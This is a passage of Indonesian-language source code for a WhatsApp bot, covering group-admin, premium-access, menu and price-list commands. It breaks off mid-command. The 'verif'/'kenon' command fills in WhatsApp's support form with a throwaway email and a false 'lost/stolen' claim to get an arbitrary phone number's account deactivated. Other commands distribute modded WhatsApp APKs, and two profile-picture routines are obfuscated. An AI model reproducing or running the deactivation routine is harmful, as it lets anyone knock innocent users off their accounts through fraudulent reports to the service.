if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
     if (args[0] === 'open'){
await haikal.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(from, buttons, `Mode Edit Info`, haikal.user.name, m)

    }
    }
    break
//=================================================//
    case 'join': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply('Sabar Cuy Loading')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
//=================================================//
case 'setppbot': {
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await haikal.groupUpdateDescription(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'once': case 'toonce': { 
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
case 'ss': {
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
m.reply(res)
});
break
//=================================================//
case 'kick': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'addakses':
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await haikal.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
break
case 'hapusakses':
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
yau = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(yau)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${yau} Telah Di Hapus Premium!`)
break
case 'listakses':
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
teksiu = '*List Premium*\n\n'
for (let haikal of prem) {
teksiu += `- ${haikal}\n`
}
teksiu += `\n*Total : ${prem.length}*`
haikal.sendMessage(from, { text: teksiu.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'add': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isPrem) return replyprem(mess.premium)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isPrem) return replyprem(mess.premium)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.sticker[hash] && global.db.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'public': {
if (!isPrem) return replyprem(mess.premium)
haikal.public = true
m.reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isPrem) return replyprem(mess.premium)
haikal.public = false
m.reply('Sukses Change To Self')
}
break
case 'listcmd': {
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(from, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'antilink': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================//
case 'addowner':
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
yaki = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Owner!!!`)
break
case 'listowner':
teksooo = '*List Owner*\n\n'
for (let haikal of owner) {
teksooo += `- ${haikal}\n`
}
teksooo += `\n*Total : ${owner.length}*`
haikal.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
case 'listmenu':
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessageNya = {
text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
footer: "List By Geekz",
buttonText: "Click Here",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsge = await haikal.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case 'dellist':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return m.reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break
case 'updatelist':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break
//=================================================//
//=================================================//
case 'owner': case 'crator':{
haikal.sendContact(from, global.owner, m)
}
break
//=================================================//
case 'menu': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
${menu}`)
}
break
case 'allmenu': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
${allmenu}`)
}
break
case 'textmaker': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
${menu}`)
}
break
//=================================================/
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (!isPrem) return replyprem(mess.premium)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
haikal.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'jadian': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(from, buttonMessage, {mentions: menst})
}
break

//=================================================//
case 'verif': case 'kenon': {
if (!isPrem) return replyprem(mess.premium)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hilang/Dicuri: Mohon nonaktifkan akun saya")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19382.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006861186")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
haikal.sendMessage(from, { text: util.format(res.data)}, { quoted:m })
}
break
//=================================================//
case 'buypremium':{
const seactiones = [
{
title: `LIST PREMIUM`,
rows: [
{title: `1 MINGGU 15K`, rowId: `${prefix}premkay 1minggu`},
{title: `1 BULAN 50K`, rowId: `${prefix}premkay 1bulan`},
{title: `2 BULAN 100K`, rowId: `${prefix}premkay 1tahun`},
]
}
]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
haikal.sendMessage(from, listSw, { quoted: m })
}
break
case 'premkay':
if ((args[0]) == '1minggu'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 25K • Premium 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1bulan'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 75K • Premium 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1tahun'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 200K • Premium 2 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
//=================================================//
case 'panel': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist Harga AmGeekz Panel* :

⚡PAKET G1
1GB RAM/1GB Disk/25% CPU
Rp10.000,00/1 BULAN
⚡PAKET G2
2GB RAM/2GB Disk/50% CPU
Rp15.000,00/1 BULAN
⚡PAKET G3
3GB RAM/3GB Disk/75% CPU
Rp20.000,00/1 BULAN
⚡PAKET G4
4GB RAM/4GB Disk/100% CPU
Rp25.000,00/1 BULAN
⚡PAKET G5
5GB RAM/5GB Disk/125% CPU
Rp30.000,00/1 BULAN
⚡PAKET G6
6GB RAM/6GB Disk/150% CPU
Rp35.000.00/1 BULAN
⚡PAKET G7
7GB RAM/7GB Disk/175% CPU
Rp40.000.00/1 BULAN

---------------------------------------
Pricelist Perpanjang Masa Aktif AmGeekz Panel :

⚡PAKET G1 = Rp5.000
⚡PAKET G2 = Rp7.500
⚡PAKET G3 = Rp10.000
⚡PAKET G4 = Rp12.500
⚡PAKET G5 = Rp15.000
⚡PAKET G6 = Rp17.500
⚡PAKET G7 = Rp20.000

Nb:
Melakukan top up saldo artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*[ Administrator]*
contact.amgeekz.site
Admin1 = 6285649455626
Admin2 = 62895422836123
Admin3 = 6281214281312
`)
}
break
//=================================================//
case 'hwcap': {
if (!isPrem) return replyprem(mess.premium)
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
	"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/31951004_205028582071289_7451583224610714757_n.enc?ccb=11-4&oh=01_AdRBT7HNBPyQQRxgxcS0OdbzgIO1Q7B3t316BwfhiMNoaA&oe=6400A8EA&mms3=true",
					"mimetype": "application/vnd.android.package-archive",
					"title": "Clone.apk",
					"fileSha256": "DVOPopJFEjadi+S8w4Tugh4UsVxOI/ke7dCQT7kYHoI=",
					"fileLength": "43953765",
					"pageCount": 0,
					"mediaKey": "q/eLFGKgk0EGJJbkBddI52xR+zwa5EGZd0O2BNRIFOM=",
					"fileName": "Clone.apk",
					"fileEncSha256": "IEKSm/CKvqkQqOlCmwRu1bZHxweIsXRjW2VgVZ0waPs=",
					"directPath": "/v/t62.7119-24/31951004_205028582071289_7451583224610714757_n.enc?ccb=11-4&oh=01_AdRBT7HNBPyQQRxgxcS0OdbzgIO1Q7B3t316BwfhiMNoaA&oe=6400A8EA",
					"mediaKeyTimestamp": "1675175336",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139999999
Size: 41.92M
Versi Wa   : 2.23.3.7
Packages   : com.privatehwmods
Tanda Tangan : V1 + V2 + V3
`)
}
break
case 'hwcap2': {
if (!isPrem) return replyprem(mess.premium)
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
		"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/AnFXWA29BkVTq-LVMiMSCFBebViteq85mMsVs7N_BBCe.enc",
					"mimetype": "application/vnd.android.package-archive",
					"title": "Clone2.apk",
					"fileSha256": "YlRKfVzaDeJqLlzWEAd4kqkZ//CnkFIX3COQdxR0puE=",
					"fileLength": "43953765",
					"pageCount": 0,
					"mediaKey": "ZxBg3vlrIpEuyihDFUe90bVgQYcMrUBJoJmvVEM3v+w=",
					"fileName": "Clone2.apk",
					"fileEncSha256": "9WQj/BGA98gzHKBEhjP/5T8VhomAdvo8gHhIjF1alFM=",
					"directPath": "/v/t62.7119-24/31091269_475643651254649_8077176393604655471_n.enc?ccb=11-4&oh=01_AdSf0JA_DI4SO4JYZHQ0Qnh1FMOLhfzTvkOLal38HwBPsg&oe=64007EC9",
					"mediaKeyTimestamp": "1675175336",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139999999
Size: 41.92M
Versi Wa   : 2.23.3.7
Packages   : com.hwmodswa
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'hwcap3': {
if (!isPrem) return replyprem(mess.premium)
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
	"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/ApR1ZVCw1XlKn_gpWOeyNzxGLlIoPpOKx-SbfXg0pVFe.enc",
					"mimetype": "application/vnd.android.package-archive",
					"title": "Unclone.apk",
					"fileSha256": "yfuuKqNilgzJRgd7ybTYezsbfeHltH1MY1PmRnSZtIM=",
					"fileLength": "43953769",
					"pageCount": 0,
					"mediaKey": "DI1OBsFASbl0/vRilM1k2mKzwgNQ0MQ7x35vtZM2NpM=",
					"fileName": "Unclone.apk",
					"fileEncSha256": "0VxkgY4gPWrBd4vY23Z2t5IHZnFq/PNJ2FAHX1aH9vs=",
					"directPath": "/v/t62.7119-24/25224182_8615779471830149_6826176497546183457_n.enc?ccb=11-4&oh=01_AdTgYhIs5O7HQpa9ELBTmxMDOKMJIevTdjrshd5R2KnZDA&oe=6400B066",
					"mediaKeyTimestamp": "1675122005",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139999999
Size: 41.92M
Versi Wa   : 2.23.3.7
